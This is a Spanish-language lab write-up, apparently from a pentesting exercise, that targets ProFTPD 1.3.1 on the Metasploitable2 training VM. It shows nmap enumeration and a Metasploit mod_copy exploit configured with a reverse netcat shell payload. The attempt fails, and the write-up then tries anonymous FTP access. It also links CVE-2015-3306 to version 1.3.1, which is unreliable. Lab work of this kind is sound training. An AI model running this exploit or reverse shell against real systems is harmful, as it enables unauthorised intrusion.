### Vulnerabilidad en ProFTPD 1.3.1 - Ejecución Remota de Comandos (RCE)

# 1. Objetivo.
Explorar y explotar una vulnerabilidad conocida en el servicio **ProFTPD 1.3.1** (puerto 2121) presente en la máquina vulnerable Metasploitable2. Esta vulnerabilidad permite la **ejecución remota de comandos** mediante el módulo `mod_copy`.

Se busca obtener acceso al sistema y, si es posible, escalar privilegios a root.

---

**Puerto implicado:** 2121/tcp  
**Servicio:** ProFTPD  
**Versión vulnerable:** 1.3.1  

# 🔍 1. Enumeración y detección del servicio.

```bash
nmap -sV -p 2121 192.168.56.102
```

### Resultado:

| PORT     | STATE | SERVICE | VERSION       |
|----------|-------|---------|---------------|
| 2121/tcp | open  | ftp     | ProFTPD 1.3.1 |

# 🔎 2. Identificación de la vulnerabilidad.

ProFTPD 1.3.1 es vulnerable a un módulo llamado mod_copy, que permite copiar archivos internos a ubicaciones accesibles externamente (como dentro del FTP público).

- 🔧 CVE relevante: [CVE-2015-3306](https://nvd.nist.gov/vuln/detail/CVE-2015-3306).

Permite ejecución de comandos si está habilitado el módulo.

# 💥 3. Explotación con Metasploit.

En Metasploit, esta vulnerabilidad está implementada. 

3.1 Abrimos la terminal y lanzamos el framework Metasploit:

```bash
msfconsole
```

3.2 Cargamos el módulo del exploit:

```bash
use exploit/unix/ftp/proftpd_modcopy_exec
```

3.3 Configuramos las opciones:

```bash
set RHOSTS 192.168.56.102
set RPORT 2121
set PAYLOAD cmd/unix/reverse_netcat
set LHOST 192.168.56.101
set LPORT 4445
```

3.4 Verificamos con show options que todo está correcto.

Nos motrará la información detallada de la configuración.

3.5 Ejecutamos el exploit:

```bash
run
```

**Resultado de la explotación:**

Tras realizar el intento de explotación con Metasploit, el módulo `mod_copy` parece **no estar habilitado** en el servidor ProFTPD, por lo que la explotación **no ha sido exitosa**.

**Mensaje de error:**

Exploit aborted due to failure: unknown: Failure copying from /proc/self/cmdline


**Conclusión:**
Aunque la versión instalada (1.3.1) es vulnerable en teoría, el módulo necesario no está habilitado en esta instancia de Metasploitable2. Esto destaca la importancia de verificar la configuración del servicio además de su versión.

# 4. Procedemos a explotación del sistema de manera manual por **FTP**:

```bash
ftp 192.168.56.102 2121
```
Nos preguntará por un usuario y una contraseña:

Name: anonymous
Password: anything

- Si nos permite entrar, podemos subir un archivo malicioso para que el servidor lo ejecute.
- Si no, debemos abortar momentáneamente este servicio vulnerable ya que el acceso anónimo está deshabilitado.



